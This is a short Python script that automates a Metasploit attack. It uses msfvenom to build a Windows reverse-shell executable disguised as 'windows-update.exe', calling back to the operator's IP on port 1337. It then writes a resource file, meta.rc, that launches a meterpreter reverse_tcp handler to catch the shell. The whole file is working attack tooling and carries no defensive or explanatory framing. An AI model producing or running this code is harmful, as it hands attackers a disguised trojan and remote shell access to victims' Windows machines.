import socket
import os
import threading
import time


def create_payload(attacker_ip, attacker_port):
    payload = f"msfvenom -p windows/shell/reverse_tcp LHOST={attacker_ip} LPORT={attacker_port} -f exe > windows-update.exe"
    os.system("cd ~; " + payload)

def create_auto():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))

    attacker_ip = s.getsockname()[0]
    attacker_port = "1337"

    create_payload(attacker_ip, attacker_port)
    content = f"""use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set lhost {attacker_ip}
  set lport {attacker_port}
  exploit
  """

    with open("meta.rc", "w") as file:
        file.write(content)


create_auto()